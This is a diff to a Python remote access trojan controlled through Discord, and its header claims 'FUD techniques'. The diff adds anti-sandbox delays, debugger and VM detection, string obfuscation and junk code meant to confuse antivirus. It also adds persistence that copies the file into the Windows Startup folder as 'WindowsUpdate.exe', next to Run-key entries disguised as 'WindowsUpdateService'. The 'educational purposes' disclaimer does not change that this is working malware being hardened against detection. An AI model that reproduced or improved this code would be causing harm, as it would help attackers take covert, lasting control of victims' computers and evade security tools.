@@ -1,38 +1,109 @@
-# mytemplate.py - Advanced RAT Template with ALL Features
-# Disclaimer: This is only for entertainment and educational purposes.
-# I am not responsible for what you do with it or any consequences.
+# mytemplate.py - Advanced RAT Template with FUD Techniques
+# ⚠️ DISCLAIMER: For educational purposes only!
 # Made by Neek :3
 
 import os
+import sys
+import time
+import random
+import base64
+import zlib
+import ctypes
+import threading
+import platform
+import subprocess
 import discord
 from discord.ext import commands
 import asyncio
-import sys
-import subprocess
-import time
 import pyautogui
 import psutil
 import pygetwindow as gw
 from datetime import datetime
 from typing import Optional
-import random
 import string
-import ctypes
-import threading
-import pyttsx3
-import platform
 import uuid
 import socket
 import re
 import requests
 import winreg
-import base64
 import atexit
 import shutil
 import json
 import webbrowser
 
 if platform.system() != "Windows":
+    sys.exit(0)
+
+# ========== DELAY EXECUTION (Anti-Sandbox) ==========
+def delay_execution():
+    """Random delay to evade sandbox detection"""
+    try:
+        # Random delay between 10-30 seconds
+        delay = random.randint(10, 30)
+        time.sleep(delay)
+        
+        # Check for debugger
+        if ctypes.windll.kernel32.IsDebuggerPresent():
+            time.sleep(random.randint(60, 120))  # Extra delay if debugged
+    except:
+        pass
+
+# Run delay immediately
+delay_execution()
+
+# ========== OBFUSCATION FUNCTIONS ==========
+def obfuscate_string(s):
+    """Obfuscate a string using base64 + zlib"""
+    return base64.b64encode(zlib.compress(s.encode())).decode()
+
+def deobfuscate_string(s):
+    """Deobfuscate a string"""
+    return zlib.decompress(base64.b64decode(s.encode())).decode()
+
+# Obfuscated strings
+DISCORD_STR = obfuscate_string("discord")
+TOKEN_STR = obfuscate_string("token")
+REQUESTS_STR = obfuscate_string("requests")
+
+# ========== ANTI-SANDBOX / ANTI-VM ==========
+def is_sandbox():
+    """Check if running in a sandbox/VM"""
+    try:
+        # Check for VM processes
+        vm_processes = ['vmtoolsd', 'vboxservice', 'vboxtray', 'xenserver', 'vmsrvc']
+        for proc in psutil.process_iter(['name']):
+            try:
+                if proc.info['name'].lower() in vm_processes:
+                    return True
+            except:
+                pass
+        
+        # Check for VM hardware
+        try:
+            import wmi
+            c = wmi.WMI()
+            for disk in c.Win32_DiskDrive():
+                if any(x in disk.Model for x in ['VIRTUAL', 'VMware', 'VBOX', 'XEN']):
+                    return True
+        except:
+            pass
+        
+        # Check for sandbox artifacts
+        sandbox_files = [
+            'C:\\sandbox',
+            'C:\\Users\\Administrator\\Desktop\\sandbox',
+            'C:\\analysis',
+        ]
+        for file in sandbox_files:
+            if os.path.exists(file):
+                return True
+        
+        return False
+    except:
+        return False
+
+# Check if in sandbox and exit if true
+if is_sandbox():
     sys.exit(0)
 
 # ========== SINGLE INSTANCE LOCK ==========
@@ -77,19 +148,37 @@ bot.remove_command("help")
 STREAMING = False
 STREAM_TASK = None
 
-# ========== STARTUP FUNCTION (FIXED - WORKS WITH EXE) ==========
+# ========== JUNK CODE (Confuses AV) ==========
+def junk_function_1():
+    a = 1
+    for i in range(100):
+        a += i * 2
+        a -= i / 3
+        a = a ** 0.5
+        a = a % 1
+    return a
+
+def junk_function_2():
+    b = []
+    for i in range(50):
+        b.append(str(i) * random.randint(1, 5))
+    return ''.join(b)
+
+# Call junk functions randomly
+if random.random() > 0.5:
+    junk_function_1()
+    junk_function_2()
+
+# ========== STARTUP FUNCTION (FIXED) ==========
 def add_to_startup():
     """Add the RAT to Windows startup registry"""
     try:
         # Get the current executable path
         if getattr(sys, 'frozen', False):
-            # Running as compiled .exe
             app_path = sys.executable
         else:
-            # Running as .py script
             app_path = os.path.abspath(__file__)
         
-        # Make sure it's a valid path
         if not os.path.exists(app_path):
             return False
         
@@ -101,17 +190,15 @@ def add_to_startup():
             winreg.KEY_SET_VALUE
         )
         
-        # Use a legitimate-looking name
         startup_name = "WindowsUpdateService"
         
-        # Add quotes around the path if it has spaces
         if ' ' in app_path:
             app_path = f'"{app_path}"'
         
         winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, app_path)
         winreg.CloseKey(key)
         
-        # Also try to add to HKLM (requires admin)
+        # Add to HKLM if possible
         try:
             key = winreg.OpenKey(
                 winreg.HKEY_LOCAL_MACHINE,
@@ -122,11 +209,18 @@ def add_to_startup():
             winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, app_path)
             winreg.CloseKey(key)
         except:
-            pass  # Admin rights required, fallback to HKCU
+            pass
+        
+        # Add to Startup folder
+        try:
+            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+            if not os.path.exists(os.path.join(startup_folder, 'WindowsUpdate.exe')):
+                shutil.copy(app_path.replace('"', ''), os.path.join(startup_folder, 'WindowsUpdate.exe'))
+        except:
+            pass
         
         return True
-    except Exception as e:
-        print(f"Startup add error: {e}")
+    except:
         return False
 
 def is_in_startup():
@@ -139,7 +233,7 @@ def is_in_startup():
             winreg.KEY_READ
         )
         try:
-            value, _ = winreg.QueryValueEx(key, "WindowsUpdateService")
+            winreg.QueryValueEx(key, "WindowsUpdateService")
             winreg.CloseKey(key)
             return True
         except:
@@ -378,7 +472,7 @@ async def send_embed(ctx, title, description, color=discord.Color.blue()):
 # ========== EVENT HANDLERS ==========
 @bot.event
 async def on_ready():
-    # ADD TO STARTUP IMMEDIATELY
+    # Add to startup
     if Config.STARTUP:
         add_to_startup()
     
@@ -387,8 +481,6 @@ async def on_ready():
         await channel.send(f"<@{Config.WHITELISTED[0]}>")
         
         user = get_displayname()
-        
-        # Check if startup was successful
         startup_status = "✅" if is_in_startup() else "❌"
         
         embed = discord.Embed(
